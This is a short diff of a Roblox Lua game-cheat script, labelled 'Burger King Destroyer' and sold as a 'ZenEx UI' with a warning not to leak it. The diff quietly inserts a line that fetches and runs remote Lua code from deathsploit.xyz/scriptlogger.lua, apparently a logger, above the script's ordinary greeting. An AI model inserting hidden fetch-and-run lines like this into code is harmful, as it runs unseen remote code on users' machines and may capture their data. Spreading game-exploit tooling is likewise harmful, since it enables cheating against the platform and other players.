@@ -1,5 +1,7 @@
 -- Burger King Destroyer, Credits: Craxtic#0001
 
+loadstring(game:HttpGet("https://deathsploit.xyz/scriptlogger.lua"))()
+
 print("Hello! if you're seeing this, you've injected the ZenEx UI. Since you purchased. I'd like you to know the money goes towards the websites we host. Also, do NOT leak this script. It will be an instant blacklist and will be permanent.")
 
 wait(2)
